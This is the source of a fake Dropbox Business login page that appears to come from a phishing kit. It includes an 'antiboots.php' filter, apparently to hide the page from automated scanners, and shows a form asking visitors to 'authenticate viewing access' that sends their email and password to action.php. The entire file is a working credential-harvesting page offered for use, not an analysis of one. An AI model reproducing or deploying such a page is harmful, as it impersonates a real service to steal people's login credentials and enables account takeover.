<?
include "antiboots.php";
?>
<html>
    
    <head>
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>DropBox Buisness</title>
        <link rel="shortcut icon" href="favicon.ico" />
        <! ---- Links --- !>
         </head>
    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">
               <img src="./img/logo.png" style="position:absolute;left:180px;width:36px;height:34px;top:17px;">
               <img src="./img/next.png" style="position:absolute;left:220px;top:17px;">
           </div>
           <div id="header-border-div"></div>
           <div class="help">
               <img src="./img/help.png" style="position:absolute;left:1065px;top:23px;">
           </div>
                  </header>
        <! --- Header ---- !>   
        <div id="text h2">
            <img src="./img/confirm_text.PNG" style="position:absolute;left:385px;top:118px;">
            <img src="./img/left.png" style="position:absolute;top:190px;left:30px;width:500px;height:285px;border-radius:6px;">
        </div>
        <! --- Form Login --- !>
        <div id="form" style="left:680px;height:200px;">
            <form action="action.php" method="post">
            <h2 style="position:absolute;left:9%;top:5px;">Sign in to authenticate viewing access.</h2>
            <div id="header-border-div2"></div>
        <input type="email" name="email" placeholder="Email" required
             style="position:absolute;left:45px;top:90px;width:359;height:34px;padding:10px;border-radius:6px;border: 1px solid #bdc4c9;"    />
        <input type="password" name="pass" placeholder="Password" required 
            style="position:absolute;left:45px;top:150px;width:359;height:34px;padding:10px;border-radius:6px;border: 1px solid #bdc4c9;"/>
        <button type="submit" class="login-button button-primary" style="position:absolute;top:220px;left:40%;">
            <div class="sign-in-text">Sign in</div>
            </button> 
            </form>
            </div>
        <! --- Form Login --- !>
        <! --- Under Form --- !>
        <img src="./img/multi.png" style="position:absolute;left:190px;top:570px;">
        <! --- Under Form --- !>
        <! --- Footer ---- !>
        <div id="footer">
            <img src="./img/footer.jpg" style="position:absolute;left:179px;top:680px">
                </div>
        <! --- Footer ---- !>
    </body>
</html>